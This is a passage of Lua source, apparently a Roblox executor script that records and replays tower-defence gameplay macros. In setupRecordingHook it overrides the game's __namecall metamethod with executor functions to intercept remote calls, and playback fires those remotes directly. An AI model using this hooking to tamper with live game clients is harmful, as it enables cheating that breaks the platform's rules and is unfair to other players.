    legacy.lastGameEndedState = state._prevGameEnded
    legacy.towerCount = state.towerCount
    legacy.lastTowerCount = state.lastTowerCount
    legacy.matchStartTime = state.roundStartTime
    
    pcall(function()
        local hasStart = false
        local bottom = LocalPlayer.PlayerGui:FindFirstChild("Bottom")
        if bottom and bottom:FindFirstChild("Frame") then
            for _, child in ipairs(bottom.Frame:GetChildren()) do
                if child:IsA("Frame") then
                    for _, subChild in ipairs(child:GetChildren()) do
                        if subChild:IsA("TextButton") and subChild.Visible then
                            for _, element in ipairs(subChild:GetChildren()) do
                                if element:IsA("TextLabel") and element.Text == "Start" then
                                    hasStart = true
                                    return
                                end
                            end
                        end
                    end
                end
            end
        end
        legacy.hasStartButton = hasStart
    end)
    
    pcall(function()
        local endGameUI = LocalPlayer.PlayerGui:FindFirstChild("EndGameUI")
        legacy.hasEndGameUI = endGameUI and endGameUI.Enabled or false
        legacy.lastEndGameUIState = legacy.hasEndGameUI
    end)
end

task.spawn(function()
    local baseInterval = getgenv().IsMacPlatform and 2 or 0.5
    local updateInterval = MobileOptimizer:getPollingInterval(baseInterval)
    if getgenv().DebugMode then
        print("[GameState] Starting game state monitor with " .. updateInterval .. "s interval")
    end
    
    while true do
        task.wait(updateInterval)
        updateGameState()
        syncLegacyState()
    end
end)

getgenv().MacroRecordingV2 = false
getgenv().MacroDataV2 = {}
getgenv().MacroRecordingStartTime = 0

getgenv()._GetEZADisplayName = function(actualTowerName)
    if getgenv().EZAUnitMapping then
        for ezaName, actualName in pairs(getgenv().EZAUnitMapping) do
            if actualName == actualTowerName then
                return ezaName
            end
        end
    end
    
    local clientData = getgenv().GetClientData and getgenv().GetClientData()
    if clientData and clientData.Slots then
        for _, slotName in ipairs({"Slot1", "Slot2", "Slot3", "Slot4", "Slot5", "Slot6"}) do
            local slotData = clientData.Slots[slotName]
            if slotData and slotData.Value == actualTowerName and slotData.UnitID then
                local unitData = (clientData.UnitData and clientData.UnitData[slotData.UnitID]) or clientData[slotData.UnitID]
                if unitData and unitData.EZA == true then
                    if actualTowerName:match("EZA$") or actualTowerName:match("Eza$") then
                        return actualTowerName
                    end
                    return actualTowerName .. "EZA"
                end
            end
        end
    end
    
    return actualTowerName
end

getgenv()._GetActualTowerName = function(displayName)
    if getgenv().EZAUnitMapping and getgenv().EZAUnitMapping[displayName] then
        return getgenv().EZAUnitMapping[displayName]
    end
    
    if displayName:match("EZA$") then
        local actualName = displayName:gsub("EZA$", "")
        return actualName
    end
    
    if displayName:match("Eza$") then
        local actualName = displayName:gsub("Eza$", "")
        return actualName
    end
    
    return displayName
end

local towerTracker = {
    placeCounts = {},
    upgradeLevels = {},
    lastPlaceTime = {},
    lastUpgradeTime = {},
    pendingActions = {},
    upgradeConnections = {}
}

getgenv()._TowerTrackerPendingActions = towerTracker.pendingActions
getgenv()._TowerUpgradeConnections = towerTracker.upgradeConnections

local function cleanupTowerTracker()
    if towerTracker.upgradeConnections then
        for tower, conn in pairs(towerTracker.upgradeConnections) do
            pcall(function() conn:Disconnect() end)
        end
    end
    towerTracker.placeCounts = {}
    towerTracker.upgradeLevels = {}
    towerTracker.lastPlaceTime = {}
    towerTracker.lastUpgradeTime = {}
    towerTracker.pendingActions = {}
    towerTracker.upgradeConnections = {}
    
    getgenv()._TowerTrackerPendingActions = towerTracker.pendingActions
    getgenv()._TowerUpgradeConnections = towerTracker.upgradeConnections
end

local function setupTowerUpgradeListener(tower)
    if not tower then
        return
    end
    
    local success, upgrade = pcall(function()
        return tower:FindFirstChild("Upgrade")
    end)
    
    if not success or not upgrade or not tower.Parent or towerTracker.upgradeConnections[tower] then 
        return 
    end
    
    local currentLevel = upgrade.Value
    towerTracker.upgradeLevels[tower] = currentLevel
    
    local connection = upgrade:GetPropertyChangedSignal("Value"):Connect(function()
        if not getgenv().MacroRecordingV2 then return end
        
        local success, err = pcall(function()
            if not tower or not tower.Parent then return end
            local currentUpgrade = tower:FindFirstChild("Upgrade")
            if not currentUpgrade then return end
            
            local towerName = tower.Name
            local currentLevel = currentUpgrade.Value
            local now = tick()
            
            if towerName == "NarutoBaryonClone" or towerName == "WukongClone" then return end
            
            local oldLevel = towerTracker.upgradeLevels[tower] or 0
            if currentLevel <= oldLevel then return end
            
            local levelsGained = currentLevel - oldLevel
            
            towerTracker.upgradeLevels[tower] = currentLevel
            towerTracker.lastUpgradeTime[tower] = now
            
            local displayName = getgenv()._GetEZADisplayName(towerName)
            
            for i = 1, levelsGained do
                local upgradeLevel = oldLevel + i - 1
                local cost = 0
                
                if getgenv().GetRecentCashDecrease then
                    cost = getgenv().GetRecentCashDecrease(0.3)
                end
                
                if cost == 0 and getgenv().GetUpgradeCost then
                    cost = getgenv().GetUpgradeCost(towerName, upgradeLevel)
                end
                
                if #getgenv().MacroDataV2 >= 5000 then
                    warn("[Macro] Recording limit reached (5000 steps). Stopping recording.")
                    getgenv().MacroRecordingV2 = false
                    return
                end
                
                table.insert(getgenv().MacroDataV2, {
                    RemoteName = "Upgrade",
                    Args = {},
                    Time = now - getgenv().MacroRecordingStartTime,
                    IsInvoke = true,
                    Cost = cost,
                    TowerName = displayName,
                    ActionType = "Upgrade",
                    Wave = getgenv().MacroGameState.currentWave
                })
            end
            
            getgenv().MacroStatusText = "Recording"
            getgenv().MacroCurrentStep = #getgenv().MacroDataV2
            getgenv().MacroTotalSteps = #getgenv().MacroDataV2
            getgenv().MacroActionText = "Upgrade"
            getgenv().MacroUnitText = displayName
            
            if getgenv().UpdateMacroStatus then
                getgenv().UpdateMacroStatus()
            end

        end)
        
        if not success then
            warn("[Macro Debug] Error in upgrade listener:", err)
        end
    end)
    
    towerTracker.upgradeConnections[tower] = connection
    
    local ancestryConnection
    ancestryConnection = tower.AncestryChanged:Connect(function()
        if not tower:IsDescendantOf(game) then
            if towerTracker.upgradeConnections[tower] then
                towerTracker.upgradeConnections[tower]:Disconnect()
                towerTracker.upgradeConnections[tower] = nil
            end
            if towerTracker.upgradeLevels[tower] then
                towerTracker.upgradeLevels[tower] = nil
            end
            if towerTracker.lastUpgradeTime[tower] then
                towerTracker.lastUpgradeTime[tower] = nil
            end
            if ancestryConnection then
                ancestryConnection:Disconnect()
                ancestryConnection = nil
            end
        end
    end)
    
    trackConnection(ancestryConnection)
end

task.spawn(function()
    local maxWait = 0
    while not workspace:FindFirstChild("Towers") and maxWait < 30 do
        task.wait(0.5)
        maxWait = maxWait + 0.5
    end
    
    if not workspace:FindFirstChild("Towers") then
        return
    end
    
    trackConnection(workspace.Towers.ChildAdded:Connect(function(tower)
        task.spawn(function()
            for attempt = 1, 10 do
                task.wait(0.1)
                local owner = tower:FindFirstChild("Owner")
                if owner and owner.Value == LocalPlayer then
                    setupTowerUpgradeListener(tower)
                    return
                end
                if owner then return end
            end
        end)
    end))
    
    task.wait(0.5)
    for _, tower in pairs(workspace.Towers:GetChildren()) do
        local owner = tower:FindFirstChild("Owner")
        if owner and owner.Value == LocalPlayer then
            setupTowerUpgradeListener(tower)
        end
    end
end)

local originalNamecall
local namecallHook

getgenv().recordAbilityUsage = function(tower, abilityName)
    local success, err = pcall(function()
        if not getgenv().MacroRecordingV2 then return end
        
        local now = tick()
        local towerName = tower.Name
        if getgenv().MacroRecordAbilities == false then
            return
        end
        
        local elapsedTime = now - getgenv().MacroRecordingStartTime
        local currentWave = getgenv().MacroGameState.currentWave
        
        if #getgenv().MacroDataV2 >= 5000 then
            warn("[Macro] Recording limit reached (5000 steps). Stopping recording.")
            getgenv().MacroRecordingV2 = false
            return
        end
        
        table.insert(getgenv().MacroDataV2, {
            RemoteName = "Ability",
            Args = {nil, abilityName},
            Time = elapsedTime,
            IsInvoke = true,
            Cost = 0,
            TowerName = towerName,
            ActionType = "Ability",
            Wave = currentWave,
            AbilityName = abilityName
        })
        
        getgenv().MacroStatusText = "Recording"
        getgenv().MacroCurrentStep = #getgenv().MacroDataV2
        getgenv().MacroTotalSteps = #getgenv().MacroDataV2
        getgenv().MacroActionText = "Ability"
        getgenv().MacroUnitText = towerName
        
        if getgenv().UpdateMacroStatus then
            getgenv().UpdateMacroStatus()
        end
    end)
    
    if not success then
        warn("[Macro] Error recording ability usage - Tower: " .. tostring(tower and tower.Name or "unknown") .. ", Ability: " .. tostring(abilityName) .. " - " .. tostring(err))
    end
end

getgenv().recordCardSelection = function(numericArg, cardName)
    local success, err = pcall(function()
        if not getgenv().MacroRecordingV2 then return end
        
        local now = tick()
        local elapsedTime = now - getgenv().MacroRecordingStartTime
        local currentWave = getgenv().MacroGameState.currentWave
        
        local cardNameNoSpaces = cardName:gsub(" ", "")
        
        if #getgenv().MacroDataV2 >= 5000 then
            warn("[Macro] Recording limit reached (5000 steps). Stopping recording.")
            getgenv().MacroRecordingV2 = false
            return
        end
        
        table.insert(getgenv().MacroDataV2, {
            RemoteName = "AbilitySelection",
            Args = {numericArg, cardNameNoSpaces},
            Time = elapsedTime,
            IsInvoke = false,
            Cost = 0,
            CardName = cardNameNoSpaces,
            ActionType = "AbilitySelection",
            Wave = currentWave
        })
        
        getgenv().MacroStatusText = "Recording"
        getgenv().MacroCurrentStep = #getgenv().MacroDataV2
        getgenv().MacroTotalSteps = #getgenv().MacroDataV2
        getgenv().MacroActionText = "Card Selection"
        getgenv().MacroUnitText = cardNameNoSpaces
        
        if getgenv().UpdateMacroStatus then
            getgenv().UpdateMacroStatus()
        end
    end)
    
    if not success then
        warn("[Macro] Error recording card selection - Arg: " .. tostring(numericArg) .. ", Card: " .. tostring(cardName) .. " - " .. tostring(err))
    end
end

local function processRemoteCall(remoteName, method, args)
    local now = tick()
    local remoteNameLower = remoteName:lower()
    
    if remoteNameLower:find("place") or remoteNameLower:find("tower") then
        if args[1] and type(args[1]) == "string" then
            local towerName = args[1]
            
            if towerTracker.lastPlaceTime[towerName] and (now - towerTracker.lastPlaceTime[towerName]) < 1.0 then
                return
            end
            
            towerTracker.lastPlaceTime[towerName] = now
            
            local countBefore = towerTracker.placeCounts[towerName] or 0
            
            task.wait(1.0)
            
            local countAfter = 0
            
            for _, tower in pairs(workspace.Towers:GetChildren()) do
                local owner = tower:FindFirstChild("Owner")
                if tower.Name == towerName and owner and owner.Value == LocalPlayer then
                    countAfter = countAfter + 1
                end
            end
            
            if countAfter > countBefore then
                local cost = 0
                
                if getgenv().GetPlaceCost then
                    cost = getgenv().GetPlaceCost(towerName)
                end
                
                if cost == 0 and getgenv().GetRecentCashDecrease then
                    cost = getgenv().GetRecentCashDecrease(0.5)
                end
                
                local savedArgs = {args[1]}
                if args[2] and typeof(args[2]) == "CFrame" then
                    savedArgs[2] = {args[2]:GetComponents()}
                end
                
                if #getgenv().MacroDataV2 >= 5000 then
                    warn("[Macro] Recording limit reached (5000 steps). Stopping recording.")
                    getgenv().MacroRecordingV2 = false
                    return
                end
                
                table.insert(getgenv().MacroDataV2, {
                    RemoteName = remoteName,
                    Args = savedArgs,
                    Time = now - getgenv().MacroRecordingStartTime,
                    IsInvoke = (method == "InvokeServer"),
                    Cost = cost,
                    TowerName = towerName,
                    ActionType = "Place",
                    Wave = getgenv().MacroGameState.currentWave
                })
                
                towerTracker.placeCounts[towerName] = countAfter
                
                getgenv().MacroStatusText = "Recording"
                getgenv().MacroCurrentStep = #getgenv().MacroDataV2
                getgenv().MacroTotalSteps = #getgenv().MacroDataV2
                getgenv().MacroActionText = "Place"
                getgenv().MacroUnitText = towerName
                
                if getgenv().UpdateMacroStatus then
                    getgenv().UpdateMacroStatus()
                end
                
            end
        end
    end
    
    if remoteNameLower:find("upgrade") then
        if args[1] and typeof(args[1]) == "Instance" then
            local tower = args[1]
            local towerName = tower.Name
            
            if towerName ~= "NarutoBaryonClone" and towerName ~= "WukongClone" then
                local upgradeKey = tower .. "_" .. now
                if not towerTracker.pendingActions[upgradeKey] then
                    towerTracker.pendingActions[upgradeKey] = now
                    
                    task.spawn(function()
                        if towerTracker.pendingActions[upgradeKey] then
                            local currentLevel = 0
                            pcall(function()
                                if tower and tower:FindFirstChild("Upgrade") then
                                    currentLevel = tower.Upgrade.Value
                                end
                            end)
                            
                            local cost = 0
                            
                            if getgenv().GetUpgradeCost then
                                cost = getgenv().GetUpgradeCost(towerName, currentLevel)
                            end
                            
                            if cost == 0 and getgenv().GetRecentCashDecrease then
                                cost = getgenv().GetRecentCashDecrease(0.3)
                            end
                            
                            if #getgenv().MacroDataV2 >= 5000 then
                                warn("[Macro] Recording limit reached (5000 steps). Stopping recording.")
                                getgenv().MacroRecordingV2 = false
                                return
                            end
                            
                            table.insert(getgenv().MacroDataV2, {
                                RemoteName = "Upgrade",
                                Args = {nil},
                                Time = now - getgenv().MacroRecordingStartTime,
                                IsInvoke = (method == "InvokeServer"),
                                Cost = cost,
                                TowerName = towerName,
                                ActionType = "Upgrade",
                                Wave = getgenv().MacroGameState.currentWave
                            })
                            
                            getgenv().MacroStatusText = "Recording"
                            getgenv().MacroCurrentStep = #getgenv().MacroDataV2
                            getgenv().MacroTotalSteps = #getgenv().MacroDataV2
                            getgenv().MacroActionText = "Upgrade"
                            getgenv().MacroUnitText = towerName
                            
                            if getgenv().UpdateMacroStatus then
                                getgenv().UpdateMacroStatus()
                            end
                            
                        end
                        
                        towerTracker.pendingActions[upgradeKey] = nil
                    end)
                end
            end
        end
    end
    
    if remoteNameLower:find("sell") then
        if args[1] and typeof(args[1]) == "Instance" then
            local tower = args[1]
            local towerName = tower.Name
            
            if #getgenv().MacroDataV2 >= 5000 then
                warn("[Macro] Recording limit reached (5000 steps). Stopping recording.")
                getgenv().MacroRecordingV2 = false
                return
            end
            
            table.insert(getgenv().MacroDataV2, {
                RemoteName = remoteName,
                Args = {nil},
                Time = now - getgenv().MacroRecordingStartTime,
                IsInvoke = (method == "InvokeServer"),
                Cost = 0,
                TowerName = towerName,
                ActionType = "Sell",
                Wave = getgenv().MacroGameState.currentWave
            })
            
            if towerTracker.placeCounts[towerName] then
                towerTracker.placeCounts[towerName] = math.max(0, towerTracker.placeCounts[towerName] - 1)
            end
            
            getgenv().MacroStatusText = "Recording"
            getgenv().MacroCurrentStep = #getgenv().MacroDataV2
            getgenv().MacroTotalSteps = #getgenv().MacroDataV2
            getgenv().MacroActionText = "Sell"
            getgenv().MacroUnitText = towerName
            getgenv().UpdateMacroStatus()
        end
    end
    
    if remoteName == "Ability" and method == "InvokeServer" then
        if args[1] and typeof(args[1]) == "Instance" and args[2] and type(args[2]) == "string" then
            local tower = args[1]
            local abilityName = args[2]
            
            if getgenv().recordAbilityUsage and getgenv().MacroRecordAbilities ~= false then
                getgenv().recordAbilityUsage(tower, abilityName)
            end
            
            if getgenv().DebugMode then
                print(string.format("[Macro Debug] Ability: %s used %s", tower.Name, abilityName))
            end
        end
    end
    
    if remoteName == "AbilitySelection" and method == "FireServer" then
        if args[1] and type(args[1]) == "number" and args[2] and type(args[2]) == "string" then
            local numericArg = args[1]
            local cardName = args[2]
            
            if getgenv().recordCardSelection then
                getgenv().recordCardSelection(numericArg, cardName)
            end
            
            if getgenv().DebugMode then
                print(string.format("[Macro Debug] Card Selection: %d -> %s", numericArg, cardName))
            end
        end
    end
end

local function setupRecordingHook()
    if namecallHook then return end
    
    if not getrawmetatable or not getnamecallmethod or not setreadonly or not newcclosure then
        warn("[Macro] Executor missing required functions for recording hook (getrawmetatable, getnamecallmethod, setreadonly, or newcclosure)")
        return
    end
    
    local mt = getrawmetatable(game)
    local oldNamecall = mt.__namecall
    setreadonly(mt, false)
    
    local lastRecordedCall = {}
    local DEBOUNCE_TIME = 0.5
    
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        
        local result = {oldNamecall(self, ...)}
        
        local shouldRecord = getgenv().MacroRecordingV2 and 
                            not getgenv()._SkipRecordingNextCall and 
                            (method == "InvokeServer" or method == "FireServer") and
                            not GameStateDetector:isLobby()
        
        if shouldRecord then
            local args = {...}
            task.spawn(function()
                pcall(function()
                    if typeof(self) == "Instance" and (self:IsA("RemoteEvent") or self:IsA("RemoteFunction")) then
                        local remoteName = self.Name
                        local callKey = remoteName .. "_" .. method
                        
                        if args[1] then
                            if typeof(args[1]) == "CFrame" then
                                local components = {args[1]:GetComponents()}
                                callKey = callKey .. "_" .. string.format("%.2f,%.2f,%.2f", components[1], components[2], components[3])
                            else
                                callKey = callKey .. "_" .. tostring(args[1])
                            end
                        end
                        
                        local now = tick()
                        
                        if lastRecordedCall[callKey] and (now - lastRecordedCall[callKey]) < DEBOUNCE_TIME then
                            return
                        end
                        
                        lastRecordedCall[callKey] = now
                        processRemoteCall(remoteName, method, args)
                    end
                end)
            end)
        end
        
        return table.unpack(result)
    end)
    
    setreadonly(mt, true)
    originalNamecall = oldNamecall
    namecallHook = true
    
    task.spawn(function()
        local lastTowerCount = {}
        local baseInterval = getgenv().IsMacPlatform and 1 or 0.5
        local checkInterval = MobileOptimizer:getPollingInterval(baseInterval)
        ErrorHandler:log("DEBUG", string.format("Tower tracking interval: %.1fs", checkInterval))
        
        while true do
            task.wait(checkInterval) 
            
            if not getgenv().MacroRecordingV2 then
                task.wait(1) 
                continue
            end
            
            pcall(function()
                local currentCounts = {}
                
                for _, tower in pairs(workspace.Towers:GetChildren()) do
                    local owner = tower:FindFirstChild("Owner")
                    if owner and owner.Value == LocalPlayer then
                        local towerName = tower.Name
                        currentCounts[towerName] = (currentCounts[towerName] or 0) + 1
                    end
                end
                
                for towerName, count in pairs(currentCounts) do
                    local lastCount = lastTowerCount[towerName] or 0
                    
                    if count > lastCount then
                        local now = tick()
                        
                        local newestTower = nil
                        for _, tower in pairs(workspace.Towers:GetChildren()) do
                            local owner = tower:FindFirstChild("Owner")
                            if tower.Name == towerName and owner and owner.Value == LocalPlayer then
                                local upgrade = tower:FindFirstChild("Upgrade")
                                if not newestTower or (upgrade and upgrade.Value == 0) then
                                    newestTower = tower
                                end
                            end
                        end
                        
                        if newestTower then
                            local cost = 0
                            
                            if getgenv().GetPlaceCost then
                                cost = getgenv().GetPlaceCost(towerName)
                            end
                            
                            if cost == 0 and getgenv().GetRecentCashDecrease then
                                cost = getgenv().GetRecentCashDecrease(0.3)
                            end
                            
                            if #getgenv().MacroDataV2 >= 5000 then
                                warn("[Macro] Recording limit reached (5000 steps). Stopping recording.")
                                getgenv().MacroRecordingV2 = false
                                return
                            end
                            
                            local displayName = getgenv()._GetEZADisplayName(towerName)
                            
                            if displayName ~= towerName then
                                print("[Macro Recording] EZA unit detected: " .. displayName .. " (actual: " .. towerName .. ")")
                            end
                            
                            local cframe = newestTower:GetPivot()
                            local savedArgs = {towerName, {cframe:GetComponents()}}
                            
                            table.insert(getgenv().MacroDataV2, {
                                RemoteName = "PlaceTower",
                                Args = savedArgs,
                                Time = now - getgenv().MacroRecordingStartTime,
                                IsInvoke = false,
                                Cost = cost,
                                TowerName = displayName,
                                ActionType = "Place",
                                Wave = getgenv().MacroGameState.currentWave
                            })
                            
                            getgenv().MacroStatusText = "Recording"
                            getgenv().MacroCurrentStep = #getgenv().MacroDataV2
                            getgenv().MacroTotalSteps = #getgenv().MacroDataV2
                            getgenv().MacroActionText = "Place"
                            getgenv().MacroUnitText = displayName
                            
                            if getgenv().UpdateMacroStatus then
                                getgenv().UpdateMacroStatus()
                            end
                            
                        end
                    end
                end
                
                lastTowerCount = currentCounts
            end)
        end
    end)
    
    namecallHook = true
end


local function monitorEndGameUI()
    task.spawn(function()
        while true do
            task.wait(0.5)
            
            if getgenv().MacroRecordingV2 and getgenv().MacroGameState.hasEndGameUI then
                getgenv().MacroRecordingV2 = false
                
                cleanupTowerTracker()
                
                pcall(function()
                    if macroRecordToggle then
                        macroRecordToggle:UpdateState(false)
                    end
                end)
                
                if #getgenv().MacroDataV2 > 0 and getgenv().CurrentMacro then
                    local success = getgenv().SaveMacro(getgenv().CurrentMacro, getgenv().MacroDataV2)
                    
                    if success then
                        getgenv().MacroPlayEnabled = true
                        getgenv().Config.toggles.MacroPlayToggle = true
                        getgenv().SaveConfig(getgenv().Config)
                        
                        pcall(function()
                            if getgenv().MacroPlayToggle then
                                getgenv().MacroPlayToggle:UpdateState(true)
                            end
                        end)
                        
                        if Window and Window.Notify then
                            Window:Notify({
                                Title = "Macro Recording",
                                Description = "Saved " .. #getgenv().MacroDataV2 .. " steps. Playback enabled.",
                                Lifetime = 5
                            })
                        end
                    end
                end
                
                getgenv().MacroStatusText = "Idle"
                getgenv().MacroCurrentStep = 0
                getgenv().MacroTotalSteps = 0
                getgenv().MacroActionText = ""
                getgenv().MacroUnitText = ""
                getgenv().UpdateMacroStatus()
                
                towerTracker = {
                    placeCounts = {},
                    upgradeLevels = {},
                    lastPlaceTime = {},
                    lastUpgradeTime = {},
                    pendingActions = {}
                }
            end
        end
    end)
end

getgenv().MacroPlaybackActive = false

getgenv().executeAbilityAction = function(action)
    local success, result = pcall(function()
        if not action.TowerName then
            warn("[Macro] Ability action missing TowerName")
            return false
        end
        
        if not action.AbilityName then
            warn("[Macro] Ability action missing AbilityName")
            return false
        end
        
        local matchingTowers = {}
        
        for _, tower in pairs(workspace.Towers:GetChildren()) do
            if tower.Name == action.TowerName then
                local owner = tower:FindFirstChild("Owner")
                if owner and owner.Value == LocalPlayer then
                    table.insert(matchingTowers, tower)
                end
            end
        end
        
        if #matchingTowers == 0 then
            warn("[Macro] Ability action skipped: Tower " .. action.TowerName .. " not found")
            return false
        end
        
        local tower = matchingTowers[1]
        
        if getgenv().DebugMode and #matchingTowers > 1 then
            debugPrint("[Macro] Multiple towers with name " .. action.TowerName .. " found, using first match: " .. tostring(tower))
        end
        
        if not tower.Parent then
            warn("[Macro] Ability action skipped: Tower " .. action.TowerName .. " was removed/sold")
            return false
        end
        
        local abilityRemote = getgenv().MacroRemoteCache["ability"]
        if not abilityRemote then
            warn("[Macro] Ability remote not found in cache")
            return false
        end
        
        local invokeSuccess, invokeErr = pcall(function()
            abilityRemote:InvokeServer(tower, action.AbilityName)
        end)
        
        if not invokeSuccess then
            warn("[Macro] Failed to invoke ability: " .. tostring(invokeErr))
            return false
        end
        
        debugPrint("[Macro] Used ability " .. action.AbilityName .. " on " .. action.TowerName)
        return true
    end)
    
    if not success then
        warn("[Macro] Error executing ability action - Tower: " .. tostring(action.TowerName) .. ", Ability: " .. tostring(action.AbilityName) .. " - " .. tostring(result))
        return false
    end
    
    return result
end

getgenv().matchCardName = function(recordedName, availableCards)
    if not recordedName or not availableCards then
        return nil
    end
    
    for _, card in ipairs(availableCards) do
        if card.name == recordedName then
            return card
        end
    end
    
    for _, card in ipairs(availableCards) do
        if card.name:gsub(" ", "") == recordedName then
            return card
        end
    end
    
    local recordedLower = recordedName:lower()
    for _, card in ipairs(availableCards) do
        if card.name:lower() == recordedLower then
            return card
        end
    end
    
    return nil
end

getgenv().executeCardSelectionAction = function(action)
    local success, result = pcall(function()
        if not action.Args or not action.Args[1] then
            warn("[Macro] Card selection action missing numeric argument")
            return false
        end
        
        if not action.CardName then
            warn("[Macro] Card selection action missing CardName")
            return false
        end
        
        local availableCards = getAvailableCards()
        if not availableCards or #availableCards == 0 then
            warn("[Macro] Card selection skipped: No cards available in UI")
            return false
        end
        
        local matchedCard = getgenv().matchCardName(action.CardName, availableCards)
        if not matchedCard then
            warn("[Macro] Card selection skipped: Card " .. action.CardName .. " not found")
            return false
        end
        
        local abilitySelectionRemote = getgenv().MacroRemoteCache["abilityselection"]
        if not abilitySelectionRemote then
            warn("[Macro] AbilitySelection remote not found in cache")
            return false
        end
        
        local fireSuccess, fireErr = pcall(function()
            abilitySelectionRemote:FireServer(action.Args[1], matchedCard.name)
        end)
        
        if not fireSuccess then
            warn("[Macro] Failed to fire card selection: " .. tostring(fireErr))
            return false
        end
        
        debugPrint("[Macro] Selected card " .. matchedCard.name)
        return true
    end)
    
    if not success then
        warn("[Macro] Error executing card selection action - Card: " .. tostring(action.CardName) .. ", Arg: " .. tostring(action.Args and action.Args[1]) .. " - " .. tostring(result))
        return false
    end
    
    return result
end

local function executeAction(action, retryCount)
    retryCount = retryCount or 0
    
    if not action.RemoteName then 
        return false, "No remote name"
    end
    
    local remote = getgenv().MacroRemoteCache[action.RemoteName:lower()]
    
    if not remote and action.ActionType == "Place" then
        for name, rem in pairs(getgenv().MacroRemoteCache) do
            if name:find("place") or name:find("tower") then
                remote = rem
                print("[Macro] Using fallback remote for Place: " .. name)
                break
            end
        end
    end
    
    if not remote and action.ActionType == "Upgrade" then
        remote = getgenv().MacroRemoteCache["upgrade"]
        if remote then
            print("[Macro] Using fallback remote for Upgrade: upgrade")
        end
    end
    
    if not remote and action.ActionType == "Sell" then
        remote = getgenv().MacroRemoteCache["sell"]
        if remote then
            print("[Macro] Using fallback remote for Sell: sell")
        end
    end
    
    if not remote then 
        return false, "Remote not found: " .. action.RemoteName
    end
    
    if action.ActionType == "Place" and (not action.Args or not action.Args[1]) then
        return false, "Invalid place action: missing unit name"
    end
    
    if (action.ActionType == "Upgrade" or action.ActionType == "Sell") and not action.TowerName then
        return false, "Invalid action: missing tower name"
    end
    
    if action.ActionType == "Upgrade" then
        local towers = {}
        local allTowers = {}
        
        local towerNameToFind = getgenv()._GetActualTowerName(action.TowerName)
        
        for _, t in pairs(workspace.Towers:GetChildren()) do
            local owner = t:FindFirstChild("Owner")
            if t.Name == towerNameToFind and owner and owner.Value == LocalPlayer then
                table.insert(allTowers, t)
                local upgrade = t:FindFirstChild("Upgrade")
                local maxUpgrade = t:FindFirstChild("MaxUpgrade")
                local currentLevel = upgrade and upgrade.Value or 0
                local maxLevel = maxUpgrade and maxUpgrade.Value or 999
                if currentLevel < maxLevel then
                    table.insert(towers, {tower = t, level = currentLevel})
                end
            end
        end
        
        if #allTowers == 0 then
            return false, "No " .. action.TowerName .. " found"
        end
        
        if #towers == 0 then
            return true, "All " .. action.TowerName .. " already max level"
        end
        
        local selectedTower = nil
        local selectionMethod = "lowest_level"
        local placementCFrame = nil
        
        if not action.CFrame and getgenv().MacroPlaybackMacroData then
            for i = 1, getgenv().MacroCurrentStep - 1 do
                local prevAction = getgenv().MacroPlaybackMacroData[i]
                if prevAction and prevAction.ActionType == "Place" and prevAction.TowerName == action.TowerName then
                    if prevAction.Args and prevAction.Args[2] and type(prevAction.Args[2]) == "table" and #prevAction.Args[2] >= 12 then
                        placementCFrame = prevAction.Args[2]
                        break
                    end
                end
            end
        else
            placementCFrame = action.CFrame
        end
        
        if placementCFrame and type(placementCFrame) == "table" and #placementCFrame >= 12 then
            local success, targetCFrame = pcall(function()
                return CFrame.new(
                    placementCFrame[1], placementCFrame[2], placementCFrame[3],
                    placementCFrame[4], placementCFrame[5], placementCFrame[6],
                    placementCFrame[7], placementCFrame[8], placementCFrame[9],
                    placementCFrame[10], placementCFrame[11], placementCFrame[12]
                )
            end)
            
            if success and targetCFrame then
                local closestTower = nil
                local closestDistance = math.huge
                
                for _, towerData in ipairs(towers) do
                    local t = towerData.tower
                    local hrp = t:FindFirstChild("HumanoidRootPart")
                    if hrp and hrp:IsA("BasePart") then
                        local distance = (hrp.CFrame.Position - targetCFrame.Position).Magnitude
                        if distance < closestDistance then
                            closestDistance = distance
                            closestTower = towerData
                        end
                    end
                end
                
                if closestTower and closestDistance < 10 then
                    selectedTower = closestTower
                    selectionMethod = "cframe_match"
                end
            end
        end
        
        if not selectedTower then
            table.sort(towers, function(a, b)
                return a.level < b.level
            end)
            selectedTower = towers[1]
        end
        
        local tower = selectedTower.tower
        local oldLevel = selectedTower.level
        
        local upgrade = tower:FindFirstChild("Upgrade")
        local maxUpgrade = tower:FindFirstChild("MaxUpgrade")
        local currentLevel = upgrade and upgrade.Value or 0
        local maxLevel = maxUpgrade and maxUpgrade.Value or 999
        
        if currentLevel >= maxLevel then
            return true, "Tower already max level (" .. currentLevel .. "/" .. maxLevel .. ")"
        end
        
        if oldLevel ~= currentLevel then
            return true, "Tower level changed (" .. oldLevel .. " → " .. currentLevel .. "), skipping"
        end
        
        local ezaInfo = ""
        if towerNameToFind ~= action.TowerName then
            ezaInfo = " [EZA: " .. towerNameToFind .. "]"
        end
        
        print("[Macro] Upgrading " .. action.TowerName .. ezaInfo .. " from level " .. oldLevel .. " (method: " .. selectionMethod .. ")")
        
        local method = remote:IsA("RemoteFunction") and "InvokeServer" or "FireServer"
        local callSuccess, callResult = getgenv()._ConnectionStability_safeRemoteCall(remote, method, tower)
        
        if not callSuccess then
            return false, "Failed to call upgrade remote: " .. tostring(callResult)
        end
        
        task.wait(0.5)
        
        local newLevel = tower:FindFirstChild("Upgrade") and tower.Upgrade.Value or oldLevel
        if newLevel > oldLevel then
            print("[Macro] ✅ Upgrade successful (" .. oldLevel .. " → " .. newLevel .. ")")
            return true, "Upgraded to level " .. newLevel
        else
            print("[Macro] ❌ Upgrade failed (level unchanged: " .. oldLevel .. ")")
            if retryCount < 1 then
                task.wait(0.3)
                return executeAction(action, retryCount + 1)
            end
            return false, "Upgrade failed after retry"
        end
        
    elseif action.ActionType == "Sell" then
        local allTowers = {}
        
        local towerNameToFind = getgenv()._GetActualTowerName(action.TowerName)
        
        for _, t in pairs(workspace.Towers:GetChildren()) do
            if t.Name == towerNameToFind and t:FindFirstChild("Owner") and t.Owner.Value == LocalPlayer then
                table.insert(allTowers, t)
            end
        end
        
        if #allTowers == 0 then
            return false, "Tower not found for sell: " .. action.TowerName
        end
        
        local tower = nil
        local placementCFrame = nil
        
        if not action.CFrame and getgenv().MacroPlaybackMacroData then
            for i = 1, getgenv().MacroCurrentStep - 1 do
                local prevAction = getgenv().MacroPlaybackMacroData[i]
                if prevAction and prevAction.ActionType == "Place" and prevAction.TowerName == action.TowerName then
                    if prevAction.Args and prevAction.Args[2] and type(prevAction.Args[2]) == "table" and #prevAction.Args[2] >= 12 then
                        placementCFrame = prevAction.Args[2]
                        break
                    end
